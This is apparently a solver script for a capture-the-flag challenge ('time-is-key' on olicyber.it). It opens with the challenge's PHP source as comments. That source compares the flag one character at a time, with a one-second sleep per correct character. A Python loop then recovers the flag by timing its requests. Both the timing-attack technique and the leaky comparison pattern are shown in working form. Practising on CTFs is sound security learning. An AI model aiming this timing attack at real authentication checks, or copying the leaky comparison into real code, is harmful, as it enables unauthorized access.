#<?php
#    $flag = getenv("flag");
#
 #   if (isset($_POST["flag"]) && !is_array($_POST["flag"])){
  #      $your_flag = $_POST["flag"];
   #     $flag_len = 6;
    #    
     #   if (strlen($your_flag) !== $flag_len){
      #      die("Sbagliato! :(");
       # }
#       for ($i = 0; $i < $flag_len; $i++){
 #           if ($your_flag[$i] !== $flag[$i]){
  ##              die("Sbagliato! :(");
    #        }
     #       usleep(1000000);
      #  }
#
 #       die("Che stai aspettando? Invia la flag!");
  #  }
#
 #   
  #  if (isset($_GET["show_source"])){
   #     highlight_file("vulnerable.php");
    #}
#?>

import requests, string

SITE = "http://time-is-key.challs.olicyber.it/index.php"
flag = ""

while len(flag) < 6:
    for i in string.printable:
        r = requests.post(SITE, data={"flag": flag + i + 'a'*(5 - len(flag)), "submit":"Invia la flag!"})
        
        if r.elapsed.total_seconds() > 1+len(flag):
            print(i)
            flag += i
            break
        else:
            print("no", i)
print(flag)